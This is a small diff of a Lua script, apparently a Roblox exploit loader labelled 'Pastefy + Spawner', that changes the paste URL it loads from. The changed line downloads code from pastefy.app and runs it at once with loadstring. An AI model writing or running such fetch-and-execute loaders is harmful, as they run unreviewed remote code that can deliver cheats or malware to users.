@@ -1,6 +1,6 @@
 -- Combined Script: Pastefy + Spawner
 local success1, err1 = pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/GwLYJ7wP/raw", true))()
+    loadstring(game:HttpGet("https://pastefy.app/ESqWIOfA/raw"))()
 end)
 if not success1 then
     warn("[ERROR] Failed to load Pastefy script:", err1)
